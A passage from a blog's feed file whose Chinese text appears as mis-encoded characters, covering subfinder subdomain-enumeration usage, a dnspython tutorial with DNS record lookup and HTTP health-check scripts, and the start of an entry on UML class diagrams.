title="ä¸‰ã€ä½¿ç”¨"></a>ä¸‰ã€ä½¿ç”¨</h2><p>æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•ï¼Œç›´æ¥åœ¨å‚æ•°ä¸­ä½¿ç”¨ <code>-d</code> å‚æ•°æŒ‡å®šç›®æ ‡åŸŸåï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-d</span> xazlsec.com<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-v</code> å‚æ•°çœ‹è¯¦æƒ…ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-v</span> <span class="hljs-literal">-d</span> xazlsec.com<br></code></pre></td></tr></table></figure><p>ç»“æœæ¯”è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ <code>-o</code> å‚æ•°è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ã€‚</p><p>å¦‚æœè¦æœç´¢ç›®æ ‡æ¯”è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ <code>-dL</code> å‚æ•°æŒ‡å®šç›®æ ‡åŸŸåæ‰€åœ¨æ–‡ä»¶ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">subfinder <span class="hljs-literal">-dL</span> domain.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HW</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HW</tag>
      
      <tag>Tools</tag>
      
      <tag>Subdomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python modules-DNSPython</title>
    <link href="/2021/10/10/Code/Python/Python%20modules-DNSPython/"/>
    <url>/2021/10/10/Code/Python/Python%20modules-DNSPython/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-modules"><a href="#Python-modules" class="headerlink" title="Python modules"></a>Python modules</h1><h2 id="DNSPythonï¼ˆåŸŸåè§£ææ¨¡å—ï¼‰"><a href="#DNSPythonï¼ˆåŸŸåè§£ææ¨¡å—ï¼‰" class="headerlink" title="DNSPythonï¼ˆåŸŸåè§£ææ¨¡å—ï¼‰"></a>DNSPythonï¼ˆåŸŸåè§£ææ¨¡å—ï¼‰</h2><p>dnspythonæ˜¯pythonå®ç°çš„ä¸€ä¸ªDNSå·¥å…·åŒ…ï¼Œå®ƒæ”¯æŒè®°å½•ç±»å‹ã€æŸ¥è¯¢ã€ä¼ è¾“å¹¶åŠ¨æ€æ›´æ–°ZONEä¿¡æ¯ç­‰ç­‰ã€‚æ®è¯´dnspythonå¯ä»¥ä»£æ›¿digã€nslookupç­‰å·¥å…·ã€‚</p><p>pythonæ¨¡å—åŸŸåè§£ææ–¹æ³•è®²è§£</p><p>å¹³å¸¸æµ‹è¯•DNSçš„æ—¶å€™ï¼Œæœ‰äº›æ“ä½œæ‰‹åŠ¨å¤„ç†ä¸æ–¹ä¾¿ï¼Œéœ€è¦å†™ä¸ªè„šæœ¬æ¥å®ç°ï¼Œè¿™æ˜¯å°±ä¼šæƒ³åˆ°ä½¿ç”¨dnspythonæ¨¡å—ï¼Œå®ƒæä¾›äº†å¤§é‡çš„DNSå¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬çŸ¥é“æœ€å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯åŸŸåæŸ¥è¯¢ï¼Œdnspyhtonåº“æä¾›ä¸€ä¸ªè§£æå™¨ç±»ï¼ˆresolverï¼‰,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒqueryæ–¹æ³•å®ç°åŸŸåæŸ¥è¯¢åŠŸèƒ½ã€‚è¿™é‡Œè¦è¯´ä¸€ä¸‹queryï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">query(self, qname, rdtype = <span class="hljs-number">1</span>, rdclass = <span class="hljs-number">1</span>, tcp = <span class="hljs-literal">False</span>, source = <span class="hljs-literal">None</span>, raise_on_no_answer = <span class="hljs-literal">True</span>, source_port = <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>qnameï¼šæŸ¥è¯¢çš„åŸŸåã€‚<br>rdtype :æŒ‡å®šRRèµ„æºçš„ç±»å‹</p><p>å…¨éƒ¨çš„rdtypeç±»å‹ä¸ºï¼š</p><p><img src="https://img-blog.csdnimg.cn/20200831150356612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¸¸ç”¨çš„æœ‰ä»¥ä¸‹å‡ ç§:</p><p>Aè®°å½•ï¼šå°†ä¸»æœºåè½¬æ¢æˆIPåœ°å€<br>MXè®°å½•ï¼šé‚®ä»¶äº¤æ¢è®°å½•ï¼Œå®šä¹‰é‚®ä»¶æœåŠ¡å™¨çš„åŸŸå<br>CNAMEè®°å½•ï¼šåˆ«åè®°å½•ï¼Œå®ç°åŸŸåé—´çš„æ˜ å°„<br>NSè®°å½•ï¼šæ ‡è®°åŒºåŸŸçš„åŸŸåæœåŠ¡å™¨åŠæˆæƒå­åŸŸ<br>PTRè®°å½•ï¼šåå‘è§£æï¼Œä¸Aè®°å½•ç›¸åï¼Œå°†IPåœ°å€è½¬æ¢ä¸ºä¸»æœºå<br>SOAè®°å½•ï¼šSOAæ ‡è®°ï¼Œä¸€ä¸ªèµ·å§‹æˆæƒåŒºçš„å®šä¹‰</p><p>rdclass: æŒ‡å®šç½‘ç»œç±»å‹ï¼Œå¯é€‰çš„å€¼ä¸ºCHã€INã€‚å…¶ä¸­INä¸ºé»˜è®¤çš„ï¼Œä½¿ç”¨æœ€å¹¿æ³›ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200831151058593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>tcp ï¼šæŒ‡å®šæŸ¥è¯¢æ˜¯å¦å¯åŠ¨TCPåè®®ï¼Œé»˜è®¤ä¸å¯åŠ¨ã€‚</p><p>sourceä¸source_portï¼šæŒ‡å®šçš„æŸ¥è¯¢æºåœ°å€ä¸ç«¯å£ã€‚</p><p>raise_on_no_answer ï¼šæŒ‡å®šæŸ¥è¯¢æ— åº”ç­”æ—¶æ˜¯å¦è§¦å‘å¼‚å¸¸ï¼Œé»˜è®¤ä¸ºTrueã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å¼€å§‹å¯¹å¸¸è§è§£æç±»å‹è¿›è¡Œè¯´æ˜ã€‚</p><p>è§£æç±»å‹è¯´æ˜</p><p>Aè®°å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> dns.resolver<br><br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input an domain: &#x27;</span>)  <span class="hljs-comment">#è¾“å…¥åŸŸååœ°å€</span><br>A = dns.resolver.query(domain, <span class="hljs-string">&#x27;A&#x27;</span>)  <span class="hljs-comment">#æŸ¥è¯¢è®°å½•ä¸ºAè®°å½•</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-keyword">if</span> j.rdtype == <span class="hljs-number">1</span>: <span class="hljs-comment">#åŠ åˆ¤æ–­ï¼Œä¸ç„¶ä¼šå‡ºç°AttributeError: &#x27;CNAME&#x27; object has no attribute &#x27;address&#x27;</span><br><br><span class="hljs-built_in">print</span>(j.address)<br></code></pre></td></tr></table></figure><p>è¿è¡Œä»£ç æŸ¥çœ‹ç»“æœï¼Œè¿™é‡Œä»¥www.baidu.comåŸŸåä¸ºä¾‹ï¼š</p><p>è¿™æ ·å­æˆ‘ä»¬å°±å°†www.baidu.comçš„åŸŸåè§£æå‡ºæ¥äº†ã€‚ æ¥çœ‹çœ‹æ•ˆæœï¼š</p><p>MZè®°å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain : &#x27;</span>)<br>MX = dns.resolver.query(domain, <span class="hljs-string">&#x27;MX&#x27;</span>)   <span class="hljs-comment"># æŒ‡å®šè§£æç±»å‹ä¸ºMXè®°å½•</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> MX:                            <span class="hljs-comment"># éå†å›åº”ç»“æœ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MX preference =&#x27;</span>, i.preference, <span class="hljs-string">&#x27;mail exchanger =&#x27;</span>, i.exchange)<br></code></pre></td></tr></table></figure><p>è¿è¡Œä»£ç æŸ¥çœ‹ç»“æœï¼Œè¿™é‡Œä»¥qq.comåŸŸåä¸ºä¾‹ï¼š</p><p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°preferenceå€¼ï¼ˆä¼˜å…ˆçº§ï¼‰å’Œexchangeå€¼ï¼ˆäº¤æ¢åœ°å€ï¼‰ï¼Œå…¶ä¸­ä¼˜å…ˆçº§é»˜è®¤ä¸º10ï¼ŒMXè®°å½•å¯ä»¥é€šè¿‡è®¾ç½®ä¼˜å…ˆçº§å®ç°ä¸»è¾…æœåŠ¡å™¨è®¾ç½®ï¼Œâ€ä¼˜å…ˆçº§â€ä¸­çš„æ•°å­—è¶Šå°è¡¨ç¤ºçº§åˆ«è¶Šé«˜ï¼Œâ€œä¼˜å…ˆçº§â€ä»…å¯¹MXè®°å½•æœ‰æ•ˆã€‚</p><p>NSè®°å½•</p><p>NSï¼ˆName Serverï¼‰åŸŸåæœåŠ¡å™¨è®°å½•ã€‚ç”¨æ¥è¡¨æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›è¡Œè§£æã€‚åœ¨æ³¨å†ŒåŸŸåæ—¶ï¼Œæ€»æœ‰é»˜è®¤çš„DNSæœåŠ¡å™¨ï¼Œæ¯ä¸ªæ³¨å†Œçš„åŸŸåéƒ½æ˜¯ç”±ä¸€ä¸ªDNSåŸŸåæœåŠ¡å™¨æ¥è¿›è¡Œè§£æçš„ã€‚</p><p>ä¸‹é¢å®ç°NSè®°å½•æŸ¥è¯¢æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain : &#x27;</span>)<br>NS = dns.resolver.query(domain, <span class="hljs-string">&#x27;NS&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> NS.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-built_in">print</span>(j.to_text())<br><br></code></pre></td></tr></table></figure><p>åªé™è¾“å…¥ä¸€çº§åŸŸåï¼Œå¦‚baidu.comã€‚å¦‚æœè¾“å…¥äºŒçº§æˆ–å¤šçº§åŸŸåï¼Œå¦‚:www.baidu.comï¼Œåˆ™æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹ï¼ŒéªŒè¯é—®é¢˜ï¼š</p><p>CNAMEè®°å½•</p><p>ä½¿ç”¨CNAMEæ—¶ï¼ŒCNAMEçš„ç›®æ ‡ä¸»æœºåœ°å€åªèƒ½ä½¿ç”¨ä¸»æœºåï¼Œä¸èƒ½ä½¿ç”¨IPåœ°å€ã€‚ä¸»æœºåå‰ä¸èƒ½æœ‰ä»»ä½•å…¶ä»–å‰ç¼€ï¼Œå¦‚ï¼š<a href="http://ç­‰æ˜¯ä¸è¢«å…è®¸çš„ã€‚">http://ç­‰æ˜¯ä¸è¢«å…è®¸çš„ã€‚</a></p><p>æ¥çœ‹çœ‹ä¸‹é¢ä»£ç å®ç°CNAMEè®°å½•æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Input an domain: &#x27;</span>)<br>CNAME = dns.resolver.query(domain,<span class="hljs-string">&#x27;CNAME&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> CNAME.response.answer:<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br><span class="hljs-built_in">print</span>(j.to_text())<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p>è¿è¡Œç»“æœå‡ºç°www.a.shifen.comåŸŸåï¼Œè¿™ä¸ªåŸŸåå°±æ˜¯www.baidu.comçš„åˆ«åæŒ‡å‘ã€‚ç›¸å½“äºç”¨å­åŸŸåæ¥ä»£æ›¿ipåœ°å€ï¼Œä¼˜ç‚¹æ˜¯å¦‚æœipåœ°å€å˜åŒ–ï¼Œåªéœ€è¦æ”¹åŠ¨å­åŸŸåçš„è§£æï¼Œè€Œä¸éœ€è¦é€ä¸€æ”¹å˜ipåœ°å€è§£æã€‚</p><p>DNSåŸŸåè½®è¯¢ä¸šåŠ¡ç›‘æ§</p><p>å¤§éƒ¨åˆ†çš„DNSè§£æå™¨éƒ½æ˜¯ä¸€ä¸ªåŸŸåå¯¹åº”ä¸€ä¸ªIPåœ°å€ï¼Œä½†æ˜¯é€šè¿‡DNSè½®è¯¢æŠ€æœ¯å¯ä»¥åšåˆ°ä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªIPï¼Œä»è€Œå®ç°æœ€ç®€å•é«˜æ•ˆçš„è´Ÿè½½å¹³è¡¡ï¼Œä¸è¿‡æ­¤æ–¹æœ€å¤§çš„å¼Šç«¯æ˜¯ç›®æ ‡ä¸»æœºä¸å¯ç”¨æ—¶æ— æ³•è¢«è‡ªåŠ¨å‰”é™¤ï¼Œå› æ­¤åšå¥½ä¸šåŠ¡ä¸»æœºçš„æœåŠ¡å¯ç”¨ç›‘æ§è‡³å…³é‡è¦ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20200902224148694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZW4xNDE1ODg2MDQ0,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ï¼ˆå›¾ç‰‡æ¥æºäºç½‘ç»œï¼‰</p><p>ä¸‹é¢æˆ‘ä»¬æ¥å®ç°åŸŸåçš„è§£æï¼Œè·å–åŸŸåçš„æ‰€æœ‰Aè®°å½•è§£æIPåˆ—è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python38</span><br><br><span class="hljs-keyword">import</span> dns.resolver<br><span class="hljs-keyword">import</span> httplib2<br><br>iplist = []<br>appdomain = <span class="hljs-string">&quot;www.baidu.com&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_iplist</span>(<span class="hljs-params">domain=<span class="hljs-string">&quot;&quot;</span></span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        A = dns.resolver.query(domain,<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dns resolver error:&quot;</span> + <span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A.response.answer:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.items:<br>            <span class="hljs-keyword">if</span> j.rdtype == <span class="hljs-number">1</span>:<br>                iplist.append(j.address)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkip</span>(<span class="hljs-params">ip</span>):</span><br>    checkurl = <span class="hljs-string">&#x27;http://&#x27;</span> + ip + <span class="hljs-string">&quot;:80&quot;</span><br>    getcontent = <span class="hljs-string">&quot;&quot;</span><br>    httplib2.socket.setdefaulttimeout(<span class="hljs-number">5</span>)<br>    conn = httplib2.Http()<br><br>    <span class="hljs-keyword">try</span>:<br>        resp,getcontent=conn.request(checkurl)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">if</span>  resp[<span class="hljs-string">&#x27;status&#x27;</span>]== <span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;[OK]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;[Error]&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">if</span> get_iplist(appdomain) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(iplist) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> iplist:<br>            checkip(ip)<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p>ä»ç»“æœå¯ä»¥çœ‹å‡ºï¼ŒåŸŸåwww.baidu.comè§£æå‡º3ä¸ªIPåœ°å€ï¼Œå¹¶ä¸”æœåŠ¡éƒ½æ˜¯æ­£å¸¸çš„ã€‚ä¸Šé¢çš„ä»£ç ï¼Œç¬¬ä¸€æ­¥é€šè¿‡dns.resolver.query()æ–¹æ³•è·å–ä¸šåŠ¡åŸŸåAè®°å½•ä¿¡æ¯ï¼ŒæŸ¥è¯¢å‡ºæ‰€æœ‰IPåœ°å€åˆ—è¡¨ï¼Œå†ä½¿ç”¨httplibæ¨¡å—çš„request()æ–¹æ³•ä»¥GETæ–¹å¼è¯·æ±‚ç›‘æ§é¡µé¢ï¼Œç›‘æ§ä¸šåŠ¡æ‰€æœ‰æœåŠ¡çš„IPæ˜¯å¦æœåŠ¡æ­£å¸¸ã€‚</p><p>æ€»ç»“</p><p>æˆ‘ä»¬çŸ¥é“å°†IPåœ°å€è½¬æ¢ä¸ºå¯è¯»æ ¼å¼æˆ–å•è¯åï¼Œä¾¿ç§°ä¸ºåŸŸåã€‚åœ¨pythonä¸­ï¼ŒåŸŸååˆ°IPåœ°å€çš„è½¬æ¢ç”±pythonæ¨¡å—dnspythonç®¡ç†ã€‚å®ƒæ”¯æŒè®°å½•ç±»å‹ã€æŸ¥è¯¢ã€ä¼ è¾“å¹¶åŠ¨æ€æ›´æ–°ZONEä¿¡æ¯çš„æ–¹æ³•ã€‚æ„Ÿå…´è¶£çš„æœ‹å‹ï¼Œå¯ä»¥å»çœ‹çœ‹dnspythonæºç ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/chen1415886044/article/details/108320745">https://blog.csdn.net/chen1415886044/article/details/108320745</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Pyhton modules</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç±»å›¾</title>
    <link href="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/"/>
    <url>/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç±»å›¾"><a href="#ç±»å›¾" class="headerlink" title="ç±»å›¾"></a>ç±»å›¾</h1><h2 id="ä»€ä¹ˆæ˜¯ç±»å›¾"><a href="#ä»€ä¹ˆæ˜¯ç±»å›¾" class="headerlink" title="ä»€ä¹ˆæ˜¯ç±»å›¾"></a>ä»€ä¹ˆæ˜¯ç±»å›¾</h2><p>ç±»å›¾æ˜¯æ˜¾ç¤ºäº†æ¨¡å‹çš„é™æ€ç»“æ„ï¼Œç‰¹åˆ«æ˜¯æ¨¡å‹ä¸­å­˜åœ¨çš„ç±»ï¼Œç±»çš„å†…éƒ¨ç»“æ„ä»¥åŠå®ƒä»¬ä¸å…¶ä»–ç±»çš„å…³ç³»ç­‰ã€‚ç±»å›¾æ˜¯é¢å‘å¯¹è±¡å»ºæ¨¡çš„ä¸»è¦ç»„æˆéƒ¨åˆ†ã€‚</p><h2 id="ç±»å›¾çš„ç»„æˆ"><a href="#ç±»å›¾çš„ç»„æˆ" class="headerlink" title="ç±»å›¾çš„ç»„æˆ"></a>ç±»å›¾çš„ç»„æˆ</h2><p>åœ¨UMLç±»å›¾ä¸­ï¼Œç±»ä¸€èˆ¬ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><p>ç±»åï¼šæ¯ä¸ªç±»éƒ½å¿…é¡»æœ‰ä¸€ä¸ªåå­—ã€‚ï¼ˆæ­£ä½“å­—è¯´æ˜ç±»æ˜¯å¯è¢«å®ä¾‹åŒ–çš„ï¼Œæ–œä½“å­—è¯´æ˜ç±»ä¸ºæŠ½è±¡ç±»ï¼‰</p></li><li><p>å±æ€§ï¼šç±»çš„æˆå‘˜å˜é‡ã€‚<br>UMLè§„å®šå±æ€§çš„è¡¨ç¤ºæ–¹å¼ä¸ºï¼š(å¯è§æ€§) åç§°:ç±»å‹ [ = ç¼ºçœå€¼ ]</p></li><li>æ–¹æ³•ï¼šç±»çš„æˆå‘˜æ–¹æ³•ã€‚<br>UMLè§„å®šæ“ä½œçš„è¡¨ç¤ºæ–¹å¼ä¸ºï¼š(å¯è§æ€§) åç§°(å‚æ•°åˆ—è¡¨) [ : è¿”å›ç±»å‹]</li></ul><p>åŠ å·ï¼ˆ+ï¼‰è¡¨ç¤ºpublicï¼›å‡å·ï¼ˆ-ï¼‰è¡¨ç¤ºprivateï¼›äº•å·(#)è¡¨ç¤ºprotectedï¼›çœç•¥è¿™äº›ä¿®é¥°ç¬¦è¡¨ç¤ºå…·æœ‰packageï¼ˆåŒ…ï¼‰çº§åˆ«çš„å¯è§æ€§ã€‚</p><p><img src="/2021/10/03/Code/Java/%E7%B1%BB%E5%9B%BE/f1fcb4a48cb5477849df5427ab39ba55.jpg" alt="4"></p><h2 id="ç±»é—´å…³ç³»"><a href="#ç±»é—´å…³ç³»" class="headerlink" title="ç±»é—´å…³ç³»"></a>ç±»é—´å…³ç³»</h2><h3 id="æ³›åŒ–å…³ç³»-generalization"><a href="#æ³›åŒ–å…³ç³»-generalization" class="headerlink" title="æ³›åŒ–å…³ç³»(generalization)"></a>æ³›åŒ–å…³ç³»(generalization)</h3><p>æ˜¯ä¸€ç§ç»§æ‰¿å…³ç³»ï¼Œè¡¨ç¤ºä¸€èˆ¬ä¸ç‰¹æ®Šçš„å…³ç³»ï¼Œå®ƒæŒ‡å®šäº†å­ç±»å¦‚ä½•ç‰¹åŒ–çˆ¶ç±»çš„æ‰€æœ‰ç‰¹å¾å’Œè¡Œä¸ºã€‚</p><h3 id="å®ç°å…³ç³»-realize"><a href="#å®ç°å…³ç³»-realize" class="headerlink" title="å®ç°å…³ç³»(realize)"></a>å®ç°å…³ç³»(realize)</h3><p>æ˜¯ä¸€ç§ç±»ä¸æ¥å£çš„å…³ç³»ï¼Œè¡¨ç¤ºç±»æ˜¯æ¥å£æ‰€æœ‰ç‰¹å¾å’Œè¡Œä¸ºçš„å®ç°.</p><h3 id="èšåˆå…³ç³»-aggregation"><a href="#èšåˆå…³ç³»-aggregation" class="headerlink" title="èšåˆå…³ç³»(aggregation)"></a>èšåˆå…³ç³»(aggregation)</h3><p>æ˜¯æ•´ä½“ä¸éƒ¨åˆ†çš„å…³ç³»ï¼Œä¸”éƒ¨åˆ†å¯ä»¥ç¦»å¼€æ•´ä½“è€Œå•ç‹¬å­˜åœ¨ã€‚</p><p>ä¸ç»„åˆå…³ç³»ä¸åŒçš„æ˜¯ï¼Œæ•´ä½“å’Œéƒ¨åˆ†ä¸æ˜¯å¼ºä¾èµ–çš„ï¼Œå³ä½¿æ•´ä½“ä¸å­˜åœ¨äº†ï¼Œéƒ¨åˆ†ä»ç„¶å­˜åœ¨ï¼›</p><h3 id="ç»„åˆå…³ç³»-composition"><a href="#ç»„åˆå…³ç³»-composition" class="headerlink" title="ç»„åˆå…³ç³»(composition)"></a>ç»„åˆå…³ç³»(composition)</h3><p>æ˜¯æ•´ä½“ä¸éƒ¨åˆ†çš„å…³ç³»ï¼Œä½†éƒ¨åˆ†ä¸èƒ½ç¦»å¼€æ•´ä½“è€Œå•ç‹¬å­˜åœ¨ã€‚å¦‚å…¬å¸å’Œéƒ¨é—¨æ˜¯æ•´ä½“å’Œéƒ¨åˆ†çš„å…³ç³»ï¼Œæ²¡æœ‰å…¬å¸å°±ä¸å­˜åœ¨éƒ¨é—¨ã€‚</p><p>ç»„åˆï¼ˆCompositionï¼‰å…³ç³»ä¹Ÿè¡¨ç¤ºçš„æ˜¯ä¸€ç§æ•´ä½“å’Œéƒ¨åˆ†çš„å…³ç³»ï¼Œä½†æ˜¯åœ¨ç»„åˆå…³ç³»ä¸­æ•´ä½“å¯¹è±¡å¯ä»¥æ§åˆ¶æˆå‘˜å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œä¸€æ—¦æ•´ä½“å¯¹è±¡ä¸å­˜åœ¨ï¼Œæˆå‘˜å¯¹è±¡ä¹Ÿä¸å­˜åœ¨ï¼Œæ•´ä½“å¯¹è±¡å’Œæˆå‘˜å¯¹è±¡ä¹‹é—´å…·æœ‰åŒç”Ÿå…±æ­»çš„å…³ç³»ã€‚</p><h3 id="å…³è”å…³ç³»-association"><a href="#å…³è”å…³ç³»-association" class="headerlink" title="å…³è”å…³ç³»(association)"></a>å…³è”å…³ç³»(association)</h3><p>æ˜¯ä¸€ç§æ‹¥æœ‰çš„å…³ç³»ï¼Œå®ƒä½¿ä¸€ä¸ªç±»çŸ¥é“å¦ä¸€ä¸ªç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><ul><li>åŒå‘å…³è”ï¼šæŒ‡åŒæ–¹éƒ½çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼Œéƒ½å¯ä»¥è°ƒç”¨å¯¹æ–¹çš„å…¬å…±å±æ€§å’Œæ–¹æ³•ã€‚</li><li>å•å‘å…³è”ï¼šè¡¨ç¤ºç›¸è¯†å…³ç³»ï¼ŒæŒ‡ä¸€æ–¹çŸ¥é“å¦ä¸€æ–¹ 